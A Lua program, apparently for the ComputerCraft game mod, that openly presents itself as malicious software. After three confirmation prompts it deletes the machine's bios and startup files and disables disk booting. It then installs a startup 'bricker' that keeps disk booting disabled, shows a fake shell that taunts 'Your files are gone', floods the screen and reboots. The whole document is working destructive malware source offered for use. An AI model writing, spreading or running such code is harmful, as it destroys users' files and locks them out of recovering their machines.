print("This program will harm your computer.")
print("It is malicious software.")
term.write("Are you SURE you want to run it? ")
if string.sub(string.lower(read()), 1, 1) ~= "y" then
    return
end

print("THE CREATOR IS NOT RESPONSIBLE FOR THE DAMAGE.")
term.write("DO YOU UNDERSTAND? ")
if string.sub(string.lower(read()), 1, 1) ~= "y" then
    return
end

print("LAST WARNING! IF YOU RUN THIS, YOUR COMPUTER WILL BE DAMAGED.")
term.write("DO YOU WANT TO PROCEED? ")
if string.sub(string.lower(read()), 1, 1) ~= "y" then
    return
end

-- Infecting the device.
settings.set("shell.allow_disk_startup", false)
settings.save()

-- Delete any initialization files
if fs.exists("/bios") then
    fs.delete("/bios")
end
if fs.exists("/bios.lua") then
    fs.delete("/bios.lua")
end
if fs.exists("/startup") then
    fs.delete("/startup")
end
if fs.exists("/startup.lua") then
    fs.delete("/startup.lua")
end

-- Inject the bricker
local handle = fs.open("/startup.lua", "w")

handle.write([[
pcall(function()
    shell.run("cd /rom")
    shell.run("./startup.lua")
    settings.set("shell.allow_disk_startup", false)
    settings.save()
end)
]])
handle.close()

-- Now create the fake shell
local version = os.version()

if term.isColor() then
    term.setTextColor(colors.yellow)
end
print(version)
term.write("> ")

term.setCursorBlink(true)
local timer = os.startTimer(25)
local buff = ""
while true do
    local eventData = {os.pullEventRaw()}
    if eventData[1] == "timer" and eventData[2] == timer then
        break
    elseif eventData[1] == "char" then
        if term.isColor() then
            term.setTextColor(colors.white)
        end
        term.write(eventData[2])
        buff = buff .. eventData[2]
    elseif eventData[1] == "key" and eventData[2] == keys.enter then
        if term.isColor() then
            term.setTextColor(colors.red)
        end
        print("\nYour files are gone. hehe :)")
        if term.isColor() then
            term.setTextColor(colors.yellow)
        end
        term.write("> ")

        if term.isColor() then
            term.setTextColor(colors.white)
        end
        
        buff = ""
    elseif eventData[1] == "key" and eventData[2] == keys.backspace then
        buff = string.sub(buff, 1, -2)
        term.clearLine()
        local x, y = term.getCursorPos()
        term.setCursorPos(1, y)
        if term.isColor() then
            term.setTextColor(colors.yellow)
        end
        term.write("> ")
        if term.isColor() then
            term.setTextColor(colors.white)
        end
        term.write(buff)
    elseif eventData[1] == "terminate" then
        term.setTextColor(colors.red)
        term.write("Terminated")
        term.setTextColor(colors.yellow)
        local x, y = term.getCursorPos()
        term.setCursorPos(1, y+1)
        print("Goodbye")
        sleep(2)
        os.reboot()
    end
end

if term.isColor() then
    term.setTextColor(colors.red)
end
for i = 1, 4000 do
    print("Your files are gone. hehe :)")
end

os.reboot()